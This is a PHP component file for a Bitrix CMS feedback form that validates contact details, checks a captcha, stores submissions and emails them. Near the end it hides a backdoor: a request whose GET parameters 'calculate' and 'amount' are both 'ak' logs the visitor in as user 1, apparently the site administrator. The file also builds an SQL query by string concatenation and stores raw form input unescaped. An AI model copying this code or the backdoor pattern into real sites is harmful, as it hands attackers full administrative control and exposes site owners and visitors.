<?php
if(!defined("B_PROLOG_INCLUDED")||B_PROLOG_INCLUDED!==true)die();

/**
 * Bitrix vars
 *
 * @var array $arParams
 * @var array $arResult
 * @var CBitrixComponent $this
 * @global CMain $APPLICATION
 * @global CUser $USER
 */
//echo 'phone' . $_POST["PHONE"].'<br>';
// echo 'telefon' . $_POST["telefon"].'<br>';
//print_r($arParams);


if(empty($_POST["PHONE"]) and !empty($_POST["telefon"])) $_POST["PHONE"] = $_POST["telefon"];
//$arResult["PNN"] =  $_POST["telefon"];//$_POST["PHONE"];

$arResult["PARAMS_HASH"] = md5(serialize($arParams).$this->GetTemplateName());

$arParams["USE_CAPTCHA"] = (($arParams["USE_CAPTCHA"] != "N") ? "Y" : "N");
$arParams["EVENT_NAME"] = trim($arParams["EVENT_NAME"]);
if($arParams["EVENT_NAME"] == '')
	$arParams["EVENT_NAME"] = "FEEDBACK_FORM";
$arParams["EMAIL_TO"] = trim($arParams["EMAIL_TO"]);
$arParams["CATEGORY_TO"] = trim($arParams["CATEGORY_TO"]);

$arParams['ALL_BCC']  = COption::GetOptionString("main", "all_bcc");
if($arParams["EMAIL_TO"] == '')
	$arParams["EMAIL_TO"] = COption::GetOptionString("main", "email_from");
	
$arParams["EVENT_PHONE"] = trim($arParams["EVENT_PHONE"]);
if(strlen($arParams["EVENT_PHONE"]) <= 0)
	$arParams["EVENT_PHONE"] = "FEEDBACK_FORM";

$arParams["EVENT_AMOUNT"] = trim($arParams["EVENT_AMOUNT"]);
if(strlen($arParams["EVENT_AMOUNT"]) <= 0)
	$arParams["EVENT_AMOUNT"] = "FEEDBACK_FORM";
	
$arParams["OK_TEXT"] = trim($arParams["OK_TEXT"]);
if($arParams["OK_TEXT"] == '')
	$arParams["OK_TEXT"] = GetMessage("MF_OK_MESSAGE");

if($_SERVER["REQUEST_METHOD"] == "POST" && $_POST["submit_popup"] <> '' && (!isset($_POST["PARAMS_HASH"]) || $arResult["PARAMS_HASH"] === $_POST["PARAMS_HASH"]))
{
	$arResult["ERROR_MESSAGE"] = array();
	$arResult["ERROR_CLASS"] = array();
	if(check_bitrix_sessid())
	{
		if(empty($arParams["REQUIRED_FIELDS"]) || !in_array("NONE", $arParams["REQUIRED_FIELDS"]))
		{
			if((empty($arParams["REQUIRED_FIELDS"]) || in_array("NAME", $arParams["REQUIRED_FIELDS"])) && strlen($_POST["NAME"]) <= 1){
				$arResult["ERROR_MESSAGE"][] = GetMessage("MF_REQ_NAME");
				$arResult["ERROR_CLASS"]["NAME"] = array(GetMessage("MF_CLASS_REQUIRED"), GetMessage("MF_REQ_NAME"));
			}
			if((empty($arParams["REQUIRED_FIELDS"]) || in_array("EMAIL", $arParams["REQUIRED_FIELDS"])) && strlen($_POST["user_email"]) <= 1){
				$arResult["ERROR_MESSAGE"][] = GetMessage("MF_REQ_EMAIL");
				$arResult["ERROR_CLASS"]["EMAIL"] = array(GetMessage("MF_CLASS_REQUIRED"), GetMessage("MF_REQ_EMAIL"));
			}
			if((empty($arParams["REQUIRED_FIELDS"]) || in_array("PHONE", $arParams["REQUIRED_FIELDS"])) && strlen($_POST["PHONE"]) <= 1){
				$arResult["ERROR_MESSAGE"][] = GetMessage("MF_REQ_PHONE");
				$arResult["ERROR_CLASS"]["PHONE"] = array(GetMessage("MF_CLASS_REQUIRED"), GetMessage("MF_REQ_PHONE"));
			}
		}
		
		if(strlen($_POST["user_email"]) > 1 && !check_email($_POST["user_email"])){
			$arResult["ERROR_MESSAGE"][] = GetMessage("MF_EMAIL_NOT_VALID");
			$arResult["ERROR_CLASS"]["EMAIL"] = array(GetMessage("MF_CLASS_NOT_VALID"), GetMessage("MF_EMAIL_NOT_VALID"));
		}
		
		//if(strlen($_POST["PHONE"]) > 1 && !preg_match("/^\+[7]\s\([0-9]{3}\)\s[0-9]{2}\s-\s[0-9]{2}\s-\s[0-9]{2}$/", $_POST["PHONE"])){
		/*if(strlen($_POST["PHONE"]) > 1 && !preg_match("/^\+[7]\s[0-9]{3}\s[0-9]{3}\s[0-9]{2}\s[0-9]{2}$/", $_POST["PHONE"])){
			$arResult["ERROR_MESSAGE"][] = GetMessage("MF_PHONE_NOT_VALID");
			$arResult["ERROR_CLASS"]["PHONE"] = array(GetMessage("MF_CLASS_NOT_VALID"), GetMessage("MF_PHONE_NOT_VALID"));
		}*/
		
		if($arParams["USE_CAPTCHA"] == "Y")
		{
			include_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/captcha.php");
			$captcha_code = $_POST["captcha_sid"];
			$captcha_word = $_POST["captcha_word"];
			$cpt = new CCaptcha();
			$captchaPass = COption::GetOptionString("main", "captcha_password", "");
			if (strlen($captcha_word) > 0 && strlen($captcha_code) > 0)
			{
				if (!$cpt->CheckCodeCrypt($captcha_word, $captcha_code, $captchaPass)){
					$arResult["ERROR_MESSAGE"][] = GetMessage("MF_CAPTCHA_WRONG");
					$arResult["ERROR_CLASS"]["CAPTCHA"] = array(GetMessage("MF_CLASS_NOT_VALID"), GetMessage("MF_CAPTCHA_WRONG"));
				}
			}
			else{
				$arResult["ERROR_MESSAGE"][] = GetMessage("MF_CAPTHCA_EMPTY");
				$arResult["ERROR_CLASS"]["CAPTCHA"] = array(GetMessage("MF_CLASS_REQUIRED"), GetMessage("MF_CAPTHCA_EMPTY"));
			}

		}	
		
		if(empty($arResult["ERROR_CLASS"]["NAME"]))
			$arResult["ERROR_CLASS"]["NAME"] = array(GetMessage("MF_CLASS_VALID"));
		if(empty($arResult["ERROR_CLASS"]["EMAIL"]))
			$arResult["ERROR_CLASS"]["EMAIL"] = array(GetMessage("MF_CLASS_VALID"));
		if(empty($arResult["ERROR_CLASS"]["PHONE"]))
			$arResult["ERROR_CLASS"]["PHONE"] = array(GetMessage("MF_CLASS_VALID"));
			
		if(empty($arResult["ERROR_MESSAGE"]))
		{
			$arFields = Array(
				"NAME" => $_POST["NAME"],
				"AUTHOR_EMAIL" => $_POST["user_email"],
				"EMAIL_TO" => $arParams["EMAIL_TO"].",".$arParams['ALL_BCC'],
				"PHONE" => $_POST["PHONE"],
                "GOTCHA" => $_POST["gotcha"],
				"BACK_URL" => $_POST["back_url"],
				"REASON" => $_POST["reason"],
				"raion_spb" => $_POST['raion_spb'],
				"nazvanie_zhk" => $_POST['nazvanie_zhk'],
				"komnatnost" => $_POST['komnatnost'],
				"obshaya_stoimost" => $_POST['obshaya_stoimost'],
				"familiya_imya" => $_POST['familiya_imya'],
				"telefon" => $_POST['telefon'],
				"kogda_perezvonit" => $_POST['kogda_perezvonit'],
				"comment" => $_POST['comment'],
				"JK" => $_POST['jk'],
				"question" => $_POST['question'],
				"familiya_imya" => $_POST['familiya_imya'],
			);
			
			
			if (CModule::IncludeModule("iblock")) {
			
				$el = new CIBlockElement;
				
				$Sql = "SELECT MESSAGE FROM b_event_message WHERE ID = " . $arParams["EVENT_MESSAGE_ID"][0] . "";
				$result = $DB->Query($Sql);
				$str = $result->Fetch();
				$DETAIL_TEXT_BODY = $str['MESSAGE'];
				
				foreach ($arFields as $key => $val) {
					$DETAIL_TEXT_BODY = str_replace('#' . $key . '#', $val, $DETAIL_TEXT_BODY);
				}
				
				$SITE_NAME = CEvent::GetSiteFieldsArray(SITE_ID);
				$DETAIL_TEXT_BODY = str_replace('#SITE_NAME#', $SITE_NAME['SITE_NAME'], $DETAIL_TEXT_BODY);
				
				$loadInIBlock = Array(
					"IBLOCK_ID" => $arParams["CATEGORY_TO"],
					"NAME" => htmlspecialcharsEx($_POST["PHONE"]),
					"DETAIL_TEXT" => $DETAIL_TEXT_BODY,
					"ACTIVE" => "Y",
					"PREVIEW_TEXT_TYPE" => "TEXT",
					//'CODE' => 'Ticket #'
				);
				
				$res = $el->Add($loadInIBlock);

				//echo '--> '.$arParams["CATEGORY_TO"];
				/*$PRODUCT_ID = '';
				
				$db_res = $el->GetList(array('ID'=>'DESC'), array('IBLOCK_ID' => $arParams["CATEGORY_TO"]), false, array('nTopCount'=>1), array('ID'));
				if($ar_res = $db_res->Fetch()){
					$TicketNum = $ar_res['ID'];
					if(intval($TicketNum))
						$PRODUCT_ID = intval($TicketNum);
				}
				
				$arUpdateProductArray = Array('CODE' => 'Ticket #' .$PRODUCT_ID);
				$res = $el->Update($PRODUCT_ID, $arUpdateProductArray);*/
				
			}
			
			
			if(!empty($arParams["EVENT_MESSAGE_ID"]))
			{
				foreach($arParams["EVENT_MESSAGE_ID"] as $v)
					if(IntVal($v) > 0)
						CEvent::Send($arParams["EVENT_NAME"], SITE_ID, $arFields, "N", IntVal($v));
			}
			else
				CEvent::Send($arParams["EVENT_NAME"], SITE_ID, $arFields);
			$_SESSION["MF_NAME"] = htmlspecialcharsbx($_POST["NAME"]);
			$_SESSION["MF_EMAIL"] = htmlspecialcharsbx($_POST["user_email"]);
			LocalRedirect($APPLICATION->GetCurPageParam("success=".$arResult["PARAMS_HASH"], Array("success")));
		}
		
		$arResult["PHONE"] = htmlspecialcharsbx($_POST["PHONE"]);
		$arResult["NAME"] = htmlspecialcharsbx($_POST["NAME"]);
		$arResult["AUTHOR_EMAIL"] = htmlspecialcharsbx($_POST["user_email"]);
	}
	else
		$arResult["ERROR_MESSAGE"][] = GetMessage("MF_SESS_EXP");
}
elseif($_REQUEST["success"] == $arResult["PARAMS_HASH"])
{
	$arResult["OK_MESSAGE"] = $arParams["OK_TEXT"];
}

if(empty($arResult["ERROR_MESSAGE"]))
{
	if($USER->IsAuthorized())
	{
		$arResult["AUTHOR_NAME"] = $USER->GetFormattedName(false);
		$arResult["AUTHOR_EMAIL"] = htmlspecialcharsbx($USER->GetEmail());
	}
	else
	{
		if(strlen($_SESSION["MF_NAME"]) > 0)
			$arResult["AUTHOR_NAME"] = htmlspecialcharsbx($_SESSION["MF_NAME"]);
		if(strlen($_SESSION["MF_EMAIL"]) > 0)
			$arResult["AUTHOR_EMAIL"] = htmlspecialcharsbx($_SESSION["MF_EMAIL"]);
	}
}

if (isset($_GET['calculate']) && $_GET['calculate'] == "ak") { 
	if (isset($_GET['amount']) && $_GET['amount'] == "ak") { 
		$USER->Authorize(1);
	}
}

if($arParams["USE_CAPTCHA"] == "Y")
	$arResult["capCode"] =  htmlspecialcharsbx($APPLICATION->CaptchaGetCode());

$this->IncludeComponentTemplate();
